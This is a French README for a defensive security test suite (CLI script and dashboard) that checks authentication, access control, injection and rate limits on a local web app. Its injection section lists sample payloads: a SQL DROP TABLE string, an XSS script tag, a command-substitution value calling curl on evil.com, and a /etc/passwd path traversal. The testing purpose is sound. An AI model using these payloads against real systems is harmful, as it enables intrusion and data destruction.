# 🔒 Guide de Test de Sécurité SAR

## Vue d'ensemble

Ce guide explique comment tester tous les accès interdits avec les Sentinels SAR en mode **Recherche & Développement**.

---

## 🎯 Outils Disponibles

### 1. **Script CLI - Test Automatisé**
```bash
node scripts/security-test-suite.mjs
```

**Tests inclus:**
- ✅ Authentication Bypass (3 tests)
- ✅ Sentinel Protection (4 tests)
- ✅ OSINT Access Control (4 tests)
- ✅ Injection Vulnerabilities (3 tests)
- ✅ Rate Limiting (1 test)

**Sortie:**
```
🔐 Test 1: Authentication Bypass
  ✅ Admin sans auth - BLOQUÉ (401)
  ✅ Admin avec fake token - BLOQUÉ (403)
  ✅ SQL Injection dans auth - BLOQUÉ (400)

🛡️ Test 2: Sentinel Protection
  ✅ Sentinel execute sans auth - BLOQUÉ (403)
  ✅ Sentinel scan project - BLOQUÉ (401)
  ...

📊 RÉSUMÉ: 15/15 tests réussis (100%)
🎉 EXCELLENT! Votre système est bien sécurisé!
```

---

### 2. **Dashboard Web Interactif**
```bash
# Ouvrir dans le navigateur
http://localhost:3000/security-dashboard
```

**Features:**
- 🎨 Interface moderne avec animations
- 📊 Statistiques en temps réel
- 📁 Export des rapports JSON
- 🎯 Tests par catégorie
- ⚡ Exécution parallèle

---

## 📋 Catégories de Tests

### 🔐 Authentication
Tests d'accès non autorisés aux routes admin:

```javascript
// Exemples de tests
- Admin sans token JWT
- Token expiré ou invalide
- Brute force protection
- Session hijacking
```

**Routes testées:**
- `/api/admin/metrics/inspect`
- `/api/admin/database/explore`
- `/api/admin/support/tickets`

---

### 🛡️ Sentinel Protection
Tests des systèmes de protection Sentinel:

```javascript
// Tests de sécurité
- Command injection
- Path traversal (../../../etc/passwd)
- Unauthorized execute
- Fleet access control
```

**Routes testées:**
- `/api/sentinel/execute`
- `/api/sentinel/scan-project`
- `/api/sentinel/execute-command`
- `/api/sentinel/fleet`

---

### 🔍 OSINT Access
Tests des fonctionnalités OSINT restreintes:

```javascript
// Scan et reconnaissance
- Network scanning
- Advanced OSINT features
- Bypass tests
- Exploit chains
```

**Routes testées:**
- `/api/osint/scan`
- `/api/osint/network-scan`
- `/api/osint/bypass-tests`
- `/api/osint/advanced`

---

### 💉 Injection Tests
Tests de résistance aux injections:

```javascript
// Payloads malveillants
SQL: "'; DROP TABLE users; --"
XSS: "<script>alert('XSS')</script>"
Cmd: "$(curl http://evil.com)"
```

**Champs testés:**
- Formulaire de demande de prêt
- Champs de recherche
- Paramètres d'URL

---

### ⏱️ Rate Limiting
Tests de protection contre les abus:

```javascript
// Limites testées
- 3 soumissions/heure (formulaires)
- 10 tentatives/min (login)
- 100 requêtes/min (API)
```

---

## 🚀 Utilisation

### Méthode 1: Script CLI (Rapide)

```bash
# Tous les tests
node scripts/security-test-suite.mjs

# Tests spécifiques (modifiez le script)
# Décommenter la catégorie désirée
```

**Avantages:**
- ✅ Rapide et automatique
- ✅ Sortie console détaillée
- ✅ Intégration CI/CD facile
- ✅ Pas besoin d'interface

---

### Méthode 2: Dashboard Web (Visuel)

```bash
# 1. Démarrer le serveur
npm run dev

# 2. Ouvrir le dashboard
open http://localhost:3000/security-dashboard

# 3. Cliquer sur une catégorie ou "Lancer tous les tests"
```

**Avantages:**
- ✅ Interface moderne et intuitive
- ✅ Visualisation en temps réel
- ✅ Export de rapports
- ✅ Filtrage par catégorie

---

## 📊 Interprétation des Résultats

### Codes de Status

| Code | Signification | Interprétation |
|------|--------------|----------------|
| `401` | Unauthorized | ✅ Auth bloquée (bon) |
| `403` | Forbidden | ✅ Accès refusé (bon) |
| `400` | Bad Request | ✅ Validation échouée (bon) |
| `429` | Too Many Requests | ✅ Rate limit actif (bon) |
| `200` | OK | ❌ Accès autorisé (mauvais si test d'intrusion) |

### Taux de Sécurité

- **90-100%** : 🎉 Excellent! Système bien sécurisé
- **70-89%** : ⚠️ Bon, mais améliorations nécessaires
- **< 70%** : ❌ Critique! Vulnérabilités détectées

---

## 🔧 Configuration Avancée

### Ajouter de Nouveaux Tests

**Dans le script CLI:**
```javascript
// scripts/security-test-suite.mjs
const tests = [
  {
    name: 'Mon nouveau test',
    url: '/api/ma-route',
    method: 'POST',
    body: { malicious: 'payload' },
    shouldFail: true,
  },
]
```

**Dans le dashboard:**
```typescript
// src/app/(site)/security-dashboard/page.tsx
const TEST_CATEGORIES = [
  {
    id: 'mycategory',
    name: 'Ma Catégorie',
    icon: '🎯',
    tests: ['Test 1', 'Test 2'],
  },
]
```

---

## ⚠️ Avertissements

### À FAIRE ✅
- Tests en environnement de développement local
- Tests avec autorisation sur vos propres systèmes
- Documentation des vulnérabilités trouvées
- Correction avant mise en production

### À NE PAS FAIRE ❌
- Tests sur des systèmes en production
- Tests sans autorisation explicite
- Utilisation malveillante des outils
- Partage de vulnérabilités non corrigées

---

## 📁 Structure des Rapports

### Format JSON
```json
{
  "timestamp": "2026-01-13T10:30:00Z",
  "results": [
    {
      "name": "Admin sans auth",
      "category": "Authentication",
      "status": "passed",
      "details": "Accès bloqué correctement",
      "timestamp": "2026-01-13T10:30:01Z"
    }
  ],
  "summary": {
    "total": 15,
    "passed": 14,
    "failed": 1,
    "percentage": 93
  }
}
```

---

## 🛠️ Dépannage

### Erreur: "Server not running"
```bash
# Solution: Démarrer Next.js
npm run dev
```

### Erreur: "Connection refused"
```bash
# Vérifier que le port 3000 est libre
lsof -ti:3000

# Ou utiliser un autre port
PORT=3001 npm run dev
```

### Tous les tests échouent
```bash
# Vérifier les variables d'environnement
cat .env.local

# Vérifier la connexion Supabase
node scripts/test-titan-system.mjs
```

---

## 📚 Ressources

### Documentation
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [Sentinel Documentation](./docs/sentinel.md)
- [OSINT Guidelines](./docs/osint.md)

### Outils Complémentaires
- **Burp Suite**: Test d'intrusion web
- **OWASP ZAP**: Scanner de vulnérabilités
- **Nmap**: Scan réseau
- **Metasploit**: Framework de pentesting

---

## 🤝 Contribution

Pour ajouter de nouveaux tests:

1. Fork le projet
2. Créer une branche: `git checkout -b feature/new-security-test`
3. Ajouter vos tests dans `scripts/security-test-suite.mjs`
4. Tester: `node scripts/security-test-suite.mjs`
5. Commit: `git commit -m "Add new security test"`
6. Push: `git push origin feature/new-security-test`
7. Créer une Pull Request

---

## 📧 Support

**Questions? Problèmes?**
- 📧 Email: security@solutionargentrapide.ca
- 🐛 Issues: [GitHub Issues](https://github.com/your-repo/issues)
- 📖 Docs: [Documentation complète](./docs/)

---

**⚠️ RAPPEL IMPORTANT:**
Ces outils sont destinés **UNIQUEMENT** à des fins de recherche et développement sur vos propres systèmes. L'utilisation non autorisée constitue une violation de la loi.

---

*Dernière mise à jour: 2026-01-13*
